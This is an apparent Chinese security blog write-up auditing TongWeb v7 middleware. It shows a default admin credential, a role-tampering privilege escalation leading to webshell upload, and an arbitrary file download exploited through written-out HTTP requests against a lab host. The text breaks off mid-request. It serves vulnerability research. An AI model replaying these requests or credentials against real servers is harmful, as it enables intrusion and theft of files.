---
title: TongWeb闭源中间件代码审计
url: https://www.secpulse.com/archives/206365.html
source: 安全脉搏
date: 2025-07-02
fetch_date: 2025-10-06T23:28:42.445235
---

# TongWeb闭源中间件代码审计

[![](https://www.secpulse.com/wp-content/themes/secpulse2017/img/logo-header.png)](https://www.secpulse.com "安全脉搏")

* [首页](https://www.secpulse.com/)
* [分类阅读](https://www.secpulse.com/archives/category/category)

  #### 脉搏文库

  - [内网渗透](https://www.secpulse.com/archives/category/articles/intranet-penetration)
  - |
  - [代码审计](https://www.secpulse.com/archives/category/articles/code-audit)
  - |
  - [安全文献](https://www.secpulse.com/archives/category/articles/sec-doc)
  - |
  - [Web安全](https://www.secpulse.com/archives/category/articles/web)
  - |
  - [移动安全](https://www.secpulse.com/archives/category/articles/mobile-security)
  - |
  - [系统安全](https://www.secpulse.com/archives/category/articles/system)
  - |
  - [工控安全](https://www.secpulse.com/archives/category/articles/industrial-safety)
  - |
  - [CTF](https://www.secpulse.com/archives/category/exclusive/ctf-writeup)
  - |
  - [IOT安全](https://www.secpulse.com/archives/category/iot-security)
  - |

#### 安全建设

+ [业务安全](https://www.secpulse.com/archives/category/construction/businesssecurity)
+ |
+ [安全管理](https://www.secpulse.com/archives/category/construction/securityissue)
+ |
+ [数据分析](https://www.secpulse.com/archives/category/construction/bigdata)
+ |

#### 其他

+ [资讯](https://www.secpulse.com/archives/category/news)
+ |
+ [漏洞](https://www.secpulse.com/archives/category/vul)
+ |
+ [工具](https://www.secpulse.com/archives/category/tools)
+ |
+ [人物志](https://www.secpulse.com/archives/category/people)
+ |
+ [区块链安全](https://www.secpulse.com/archives/category/exclusive/block_chain_security)
+ |
+ [安全招聘](https://www.secpulse.com/archives/category/hiring)
+ |

- [安全问答](https://www.secpulse.com/newpage/question_list)
- [金币商城](https://www.secpulse.com/shop?donotcachepage=c010349fd98847cb9d6e07d3cbc19288)
- [安全招聘](https://www.secpulse.com/archives/category/hiring)
- [活动日程](https://www.secpulse.com/newpage/activity)
- [live课程](https://www.secpulse.com/live)
- [企业服务](https://duoyinsu.com/service.html)
- [插件社区](https://x.secpulse.com/)

小程序

![脉搏小程序](https://www.secpulse.com/wp-content/themes/secpulse2017/img/wxchat.jpg)
[登录](https://www.secpulse.com/user_login)
|
[注册](https://www.secpulse.com/user-register)

# TongWeb闭源中间件代码审计

[代码审计](https://www.secpulse.com/archives/category/articles/code-audit)

[蚁景网安实验室](https://www.secpulse.com/newpage/author?author_id=37244)
![]( https://www.secpulse.com/wp-content/themes/secpulse2017/img/renzheng2.png)

2025-07-01

15,978

应用服务器 TongWeb v7 全面支持 JavaEE7 及 JavaEE8规范，作为基础架构软件，位于操作系统与应用之间，帮助企业将业务应用集成在一个基础平台上，为应用高效、稳定、安全运行提供关键支撑，包括便捷的开发、随需应变的灵活部署、丰富的运行时监视、高效的管理等。

本文对该中间件部分公开在互联网，但未分析细节的漏洞，进行复现分析：

**sysweb后台上传getshell：**

在互联网搜索发现该版本存在sysweb后台文件下载，可惜却没有复现细节，且访问显示如下：

![](https://www.yijinglab.com/guide-img/d9634e2f-3b66-42e7-8279-c0877cdd70e5/36d25a30-e51c-40dc-b9d3-1712cf935eb1.png)

发现通过默认口令thanos/thanos123.com无法登录，且未发现任何相关的默认口令：

![](https://www.yijinglab.com/guide-img/d9634e2f-3b66-42e7-8279-c0877cdd70e5/70de2cf2-6985-4dd2-ba7c-bdfa56a0dd1d.png)

于是自己找到配置文件查看权限校验情况：

\sysweb\WEB-INF\web.xml：

![](https://www.yijinglab.com/guide-img/d9634e2f-3b66-42e7-8279-c0877cdd70e5/f6e4c3e6-6aef-4608-a0d9-e35690d64f1d.png)

发现配置情况如上，一切/\*请求均需要admin权限才行，但目前互联网暂未发现任何其他相关权限账号，自己尝试admin相关弱口令也均为成功，于是继续寻找用户相关功能点：

点击安全服务--安全域管理：

![](https://www.yijinglab.com/guide-img/d9634e2f-3b66-42e7-8279-c0877cdd70e5/e7b5cfec-10cf-4ac6-b0bf-34587fdec1bd.png)

点击该安全域：找到默认账户的thanos用户：

![](https://www.yijinglab.com/guide-img/d9634e2f-3b66-42e7-8279-c0877cdd70e5/e6cfd34c-97a3-4cea-8a3a-bb6816b2a10c.png)

点击保存，查看数据包：

![](https://www.yijinglab.com/guide-img/d9634e2f-3b66-42e7-8279-c0877cdd70e5/8dfcb7f8-55a8-46a9-a24e-6b7bc8c8fc3c.png)

发现该账户的userRole为tongweb与sysweb要求的admin并不匹配，于是点击创建用户：

![](https://www.yijinglab.com/guide-img/d9634e2f-3b66-42e7-8279-c0877cdd70e5/d64d435a-dda9-4b5e-ad2f-26b687e9201e.png)

但并未发现可以随意设置用户的useRole，于是点击保存，并拦截数据包：

![](https://www.yijinglab.com/guide-img/d9634e2f-3b66-42e7-8279-c0877cdd70e5/6693743a-ef76-4612-890f-703f1a6b1512.png)

将空白的userRole设置为admin，并放包：

![](https://www.yijinglab.com/guide-img/d9634e2f-3b66-42e7-8279-c0877cdd70e5/0c2d464b-fe0d-405e-a25e-abbd1b966af8.png)

发现创建成功。于是尝试sysweb登录：

![](https://www.yijinglab.com/guide-img/d9634e2f-3b66-42e7-8279-c0877cdd70e5/360f5245-acf5-4218-836f-2131afbc3e19.png)

发现仅仅是如上页面，但是至少权限问题解决了。

接着返回sysweb的配置文件:

![](https://www.yijinglab.com/guide-img/d9634e2f-3b66-42e7-8279-c0877cdd70e5/a23fb8d6-9a17-4baa-a632-b443331b486c.png)

跟进分析：

![](https://www.yijinglab.com/guide-img/d9634e2f-3b66-42e7-8279-c0877cdd70e5/64ec1340-0667-47ef-a727-d4a1e449356e.png)

发现未进行任何校验过滤，直接通过parseFileName()方法解析header获取文件名赋值给fileName。

构造如下文件上传数据包：

![](https://www.yijinglab.com/guide-img/d9634e2f-3b66-42e7-8279-c0877cdd70e5/879764c7-002e-4898-bb1f-e7e5118f3242.png)

上传成功，shell加一：

![](https://www.yijinglab.com/guide-img/d9634e2f-3b66-42e7-8279-c0877cdd70e5/b40167c2-df00-472c-83d3-fa042d1dcbbd.png)

**任意文件下载漏洞：**

默认账号密码:thanos/thanos123.com登录后台，在快照管理处存在下载功能点：

![](https://www.yijinglab.com/guide-img/d9634e2f-3b66-42e7-8279-c0877cdd70e5/4fe08ac8-d42a-43ad-9aaa-578372d708d8.png)

点击下载抓包查看：

![](https://www.yijinglab.com/guide-img/d9634e2f-3b66-42e7-8279-c0877cdd70e5/84144642-a18b-40a9-a9aa-f6f13ab0807f.png)

下载文件打包成压缩包下载：

![](https://www.yijinglab.com/guide-img/d9634e2f-3b66-42e7-8279-c0877cdd70e5/2cfdcb84-c9fc-47db-8ef5-aa3b5dfee054.png)

如上，疑似存在下载漏洞，跟进路由：

![](https://www.yijinglab.com/guide-img/d9634e2f-3b66-42e7-8279-c0877cdd70e5/bac00398-2abb-4b43-b2c9-916151c6d545.png)

如上，先找到类级别的路径位置，注解表示由/rest/monitor/snapshots根路径发起的请求均会被该类处理。

![](https://www.yijinglab.com/guide-img/d9634e2f-3b66-42e7-8279-c0877cdd70e5/93a564bd-91a0-4fca-9d3b-1d5ac2124e66.png)

随后再找到方法级别的路由位置，download的post请求均会被该方法处理：

可见该方法接收了前面数据包传输的参数filename，并赋值给snapshotname参数。

分析如上代码存在以下路径：

Path：根路径，由system.getProperty/temp/download组成

snapshotRootPath：由path/snapshotname组成。

![](https://www.yijinglab.com/guide-img/d9634e2f-3b66-42e7-8279-c0877cdd70e5/595529f7-bedb-49dc-860e-0f28b6de9394.png)

随后进入AgentUtil.receiveFileOrDir()进行目标文件压缩，下载，且此处未进行任何校验：

![](https://www.yijinglab.com/guide-img/d9634e2f-3b66-42e7-8279-c0877cdd70e5/2b7c87ea-9702-41b4-8362-c4cc1196b570.png)

但如果直接修改数据包filename进行任意文件下载依然会失败，因为紧接着代码进行了如下校验：

![](https://www.yijinglab.com/guide-img/d9634e2f-3b66-42e7-8279-c0877cdd70e5/e6fbefc2-007f-4bf3-b04e-a36aa33557d4.png)

判断下载路径snapshotRootPath的父路径是否是path，也就是对snapshotname与path拼接后的路径进行校验，如果snapshotname值为../../或者为/a/b这种格式则无法通过校验，也就是限制了跨目录操作。

但回过头来查看具体下载操作：

![](https://www.yijinglab.com/guide-img/d9634e2f-3b66-42e7-8279-c0877cdd70e5/6a22097c-dd14-4783-8731-fc1611d18028.png)

是通过fileOrDir路径与snapshotRootPath进行文件下载的，查找location的值：

![](https://www.yijinglab.com/guide-img/d9634e2f-3b66-42e7-8279-c0877cdd70e5/bed33cf7-b339-4afa-a807-586b40a5f7fd.png)

且发现location参数值可控：

![](https://www.yijinglab.com/guide-img/d9634e2f-3b66-42e7-8279-c0877cdd70e5/5a489544-e54d-43c7-a2d5-8c85c0f4d003.png)

于是先通过如下数据包修改location的值(修改为想任意下载的目录)：

```
POST /console/rest/monitor/snapshots/setLocation HTTP/1.1

Host: 192.168.73.130:9060

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0)
Gecko/20100101 Firefox/138.0

Accept: application/json, text/javascript, \*/\*; q=0.01

Accept-Language:
zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2

Accept-Encoding: gzip, deflate, br

Content-Type: application/x-www-form-urlencoded; charset=UTF-8

X-Requested-With: XMLHttpRequest

Content-Length: 36

Origin: http://192.168.73.130:9060

Connection: keep-alive

Referer: http://192.168.73.130:9060/console/rest

Cookie: console-c-4aff-9=EABC776A7845EFBDA555BAA1D078F628;
DWRSESSIONID=858h23g\$aEjH1iqRz1jnGBLe3rp

snapshot_location=D%3A%5CTongWeb7.42
```

随后再进行下载：

```
POST /console/rest/monitor/snapshots/download HTTP/1.1

Host: 192.168.73.130:9060

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0)
Gecko/20100101 Firefox/139.0

Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,\*/\*;q=0.8

Accept-Language:
zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2

Accept-Encodin...